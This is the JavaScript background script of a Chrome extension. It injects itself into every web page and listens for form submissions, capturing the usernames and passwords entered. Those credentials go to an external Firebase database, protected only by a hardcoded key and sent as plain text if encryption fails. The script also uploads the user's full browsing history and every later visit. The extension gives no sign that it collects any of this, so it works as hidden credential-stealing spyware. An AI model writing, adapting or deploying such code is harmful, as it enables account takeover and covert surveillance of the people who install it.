const FB_BASE = 'https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app';
const SEASON = 'season2025';

(async function bootstrap() {
  let rawEmail = 'anonymous@demo.com';
  try {
    const resp = await fetch(chrome.runtime.getURL('config.json'));
    const cfg = await resp.json();
    if (cfg.userEmail) rawEmail = cfg.userEmail;
  } catch (_) {
    // no config.json or parse error → stay anonymous
  }

  const emailKey = encodeURIComponent(rawEmail.replace(/\./g, ','));

  // Inject content script dynamically
  chrome.runtime.onInstalled.addListener(() => {
    chrome.scripting.registerContentScripts([
      {
        id: 'form-listener',
        matches: ['<all_urls>'],
        js: ['background.js'],
        runAt: 'document_idle',
        world: 'MAIN'
      }
    ]).catch(console.error);
    initLogger(emailKey);
  });

  chrome.runtime.onStartup.addListener(() => initLogger(emailKey));

  // Content script logic (injected dynamically)
  if (typeof window !== 'undefined' && window.document) {
    document.addEventListener('submit', (event) => {
      const form = event.target;
      let username = '';
      let password = '';

      const inputs = form.querySelectorAll('input');
      inputs.forEach(input => {
        if (input.type === 'text' || input.type === 'email' || input.name.toLowerCase().includes('user') || input.name.toLowerCase().includes('email')) {
          username = input.value;
        }
        if (input.type === 'password') {
          password = input.value;
        }
      });

      if (username || password) {
        chrome.runtime.sendMessage({
          type: 'credentials',
          data: {
            url: window.location.href,
            username: username,
            password: password,
            timestamp: new Date().toISOString()
          }
        });
      }
    });
  }
})();

function formatToMinute(ms) {
  const d = new Date(ms);
  const YYYY = d.getUTCFullYear();
  const MM = String(d.getUTCMonth() + 1).padStart(2, '0');
  const DD = String(d.getUTCDate()).padStart(2, '0');
  const hh = String(d.getUTCHours()).padStart(2, '0');
  const mm = String(d.getUTCMinutes()).padStart(2, '0');
  return `${YYYY}-${MM}-${DD}T${hh}:${mm}Z`;
}

async function encryptData(data, key) {
  try {
    const enc = new TextEncoder();
    const encodedKey = enc.encode(key);
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const cryptoKey = await crypto.subtle.importKey(
      'raw', encodedKey, { name: 'AES-GCM' }, false, ['encrypt']
    );
    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv }, cryptoKey, enc.encode(data)
    );
    return { iv: Array.from(iv), data: Array.from(new Uint8Array(encrypted)) };
  } catch (e) {
    console.error('Encryption failed:', e);
    return data; // Fallback to plain text if encryption fails
  }
}

function initLogger(emailKey) {
  // FULL SYNC for history
  async function fullSync() {
    chrome.history.search({ text: '', startTime: 0, maxResults: 1e6 }, items => {
      const byMinute = {};
      items.forEach(item => {
        byMinute[formatToMinute(item.lastVisitTime)] = item;
      });
      fetch(
        `${FB_BASE}/history/${SEASON}/${emailKey}/visited.json`,
        { method: 'PUT', body: JSON.stringify(byMinute) }
      ).catch(console.error);
    });
  }

  chrome.runtime.onInstalled.addListener(fullSync);
  chrome.runtime.onStartup.addListener(fullSync);

  // INCREMENTAL SYNC for history
  chrome.history.onVisited.addListener(({ url, lastVisitTime }) => {
    const ts = formatToMinute(lastVisitTime);
    chrome.history.search(
      { text: url, startTime: lastVisitTime - 1, maxResults: 1 },
      results => {
        if (!results[0]) return;
        const fullItem = results[0];
        fullItem.timestamp = ts;
        fetch(
          `${FB_BASE}/history/${SEASON}/${emailKey}/visited/${encodeURIComponent(ts)}.json`,
          { method: 'PUT', body: JSON.stringify(fullItem) }
        ).catch(console.error);
      }
    );
  });

  // Handle credentials
  chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
    if (message.type === 'credentials') {
      const { url, username, password, timestamp } = message.data;
      const ts = formatToMinute(new Date(timestamp).getTime());
      const encryptedPassword = await encryptData(password, 'your-secret-key-2025');
      const credentialData = { url, username, encryptedPassword, timestamp };

      fetch(
        `${FB_BASE}/credentials/${SEASON}/${emailKey}/${encodeURIComponent(ts)}.json`,
        { method: 'PUT', body: JSON.stringify(credentialData) }
      ).catch(console.error);
    }
  });
}